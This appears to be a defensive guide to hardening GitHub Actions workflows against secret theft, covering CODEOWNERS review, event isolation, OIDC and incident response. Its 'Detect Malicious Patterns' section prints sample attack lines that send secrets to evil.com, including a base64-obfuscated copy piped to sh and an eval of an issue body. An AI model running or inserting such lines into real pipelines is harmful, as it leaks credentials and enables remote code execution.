# Workflow Security: Protection Against Malicious Actions

## The Threat Model

A malicious actor (even with maintainer access) could attempt to:

1. Exfiltrate secrets via workflow modifications
2. Use grep/curl to send secrets to external APIs
3. Encode and hide malicious commands
4. Modify workflows to run on pull_request_target
5. Add new "dependencies" that steal data

## Protection Strategies

### 1. Branch Protection + CODEOWNERS

Create `.github/CODEOWNERS`:

```yaml
# Require security team approval for workflow changes
.github/workflows/ @security-team @owner
.github/actions/ @security-team @owner
```

Enable branch protection:

- Require CODEOWNERS review for workflow changes
- No bypass for administrators
- Dismiss stale reviews on new commits

### 2. Workflow Isolation by Event Type

```yaml
# SAFE: Fork PRs (no secrets)
name: CI Tests
on:
  pull_request:  # Not pull_request_target!
permissions:
  contents: read

# DANGEROUS: Only after merge
name: Deploy
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write  # For OIDC only
```

### 3. Environment Protection

```yaml
jobs:
  deploy:
    environment:
      name: production
      # Requires manual approval from specific users
    steps:
      - name: Deploy
        env:
          API_KEY: ${{ secrets.API_KEY }}
```

### 4. Secret Access Controls

1. **Use OIDC instead of long-lived secrets**:

   ```yaml
   - uses: aws-actions/configure-aws-credentials@v4
     with:
       role-to-assume: arn:aws:iam::123456789:role/GitHubActions
       aws-region: us-east-1
   ```

2. **Separate secrets by environment**:

   - `DEV_API_KEY` - for development
   - `PROD_API_KEY` - for production (protected environment)

3. **Audit secret access**:
   - Regular review of workflow runs
   - Check for unusual patterns

### 5. Detect Malicious Patterns

Our security audit script checks for:

```bash
# Dangerous: Direct secret in run command
run: curl -X POST https://evil.com -d "secret=${{ secrets.API_KEY }}"

# Dangerous: Base64 encoded commands
run: echo "Y3VybCBldmlsLmNvbSAtZCAke3tzZWNyZXRzLkFQSV9LRVl9fQ==" | base64 -d | sh

# Dangerous: Dynamic command execution
run: eval "${{ github.event.issue.body }}"
```

### 6. Workflow Review Process

Before merging workflow changes:

1. Check for pull_request_target usage
2. Verify no secrets in run commands
3. Ensure minimal permissions
4. Look for encoded/obfuscated commands
5. Verify all actions are pinned

### 7. Runtime Protections

1. **GitHub Advanced Security** (if available):

   - Secret scanning in code
   - Push protection
   - Security alerts

2. **Third-party monitoring**:
   - Monitor outbound network traffic
   - Alert on unusual API calls
   - Log all workflow executions

### 8. Emergency Response

If you suspect compromise:

1. **Immediately**:

   - Revoke all repository secrets
   - Disable GitHub Actions
   - Review recent workflow runs

2. **Investigation**:

   - Audit workflow history
   - Check for data exfiltration
   - Review merged PRs

3. **Recovery**:
   - Rotate all secrets
   - Re-enable with stricter controls
   - Document lessons learned

## Example: Secure Workflow Template

```yaml
name: Secure CI/CD Pipeline
on:
  # Safe events for untrusted code
  pull_request:
    branches: [main]

  # Trusted events after merge
  push:
    branches: [main]

# Default minimal permissions
permissions:
  contents: read

jobs:
  # Run on PRs - no secrets available
  test:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@SHA # Always pin!
      - run: npm test

  # Run after merge - with protections
  deploy:
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    environment: production # Requires approval
    permissions:
      id-token: write # For OIDC
    steps:
      - uses: actions/checkout@SHA
      - name: Deploy
        run: |
          # Secrets only in env vars, never in commands
          export API_ENDPOINT="https://api.example.com"
          ./deploy.sh
        env:
          API_KEY: ${{ secrets.PROD_API_KEY }}
```

## Automated Monitoring

Add to your security workflow:

```yaml
- name: Audit Workflow Security
  run: |
    ./scripts/audit-workflow-security.sh

- name: Check for Secret Exposure
  run: |
    # Ensure no secrets in logs
    ! grep -r "secret\|password\|api.key" .github/workflows/
```

## Remember

- **Trust but verify** - Even maintainers need oversight
- **Defense in depth** - Multiple layers of protection
- **Principle of least privilege** - Minimal permissions always
- **Audit regularly** - Review logs and access patterns
- **Automate security** - Make the secure path the easy path
